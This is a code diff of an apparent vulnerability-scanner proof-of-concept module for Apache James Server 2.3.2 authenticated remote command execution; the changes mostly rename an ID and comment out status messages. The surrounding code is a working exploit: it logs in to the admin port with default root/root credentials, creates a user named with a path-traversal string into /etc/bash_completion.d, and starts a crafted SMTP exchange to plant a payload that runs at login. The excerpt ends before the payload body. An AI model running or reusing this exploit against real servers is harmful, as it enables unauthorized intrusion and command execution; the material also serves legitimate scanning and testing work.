@@ -8,12 +8,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'ApacheJamesServer' # 平台漏洞编号
+    vuln_id = 'ApacheJamesServer_0101' # 平台漏洞编号
     name = 'Apache James Server 2.3.2 Authenticated User Remote Command Execution' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
     disclosure_date = '2014-10-16'  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     Info: This exploit works on default installation of Apache James Server 2.3.2
     Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d.
     ''' # 漏洞描述
@@ -45,7 +45,7 @@ class Poc(ABPoc):
             pwd = 'root'
             target_parse = urlparse.urlparse(self.target)
             ip = socket.gethostbyname(target_parse.hostname)
-            self.output.info('[+]Connecting to James Remote Administration Tool...')
+            # self.output.info('[+]Connecting to James Remote Administration Tool...')
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((ip,4555))
             s.recv(1024)
@@ -53,17 +53,17 @@ class Poc(ABPoc):
             s.recv(1024)
             s.send(pwd + "\n")
             s.recv(1024)
-            self.output.info('"[+]Creating user..."')
+            # self.output.info('"[+]Creating user..."')
             s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
             s.recv(1024)
             s.send("quit\n")
             s.close()
-            self.output.info('[+]Connecting to James SMTP server...')
+            # self.output.info('[+]Connecting to James SMTP server...')
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((ip,25))
             s.send("ehlo team@team.pl\r\n")
             self.recvAndsleep(s)
-            print "[+]Sending payload..."
+            # print "[+]Sending payload..."
             s.send("mail from: <'@team.pl>\r\n")
             self.recvAndsleep(s)
             # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
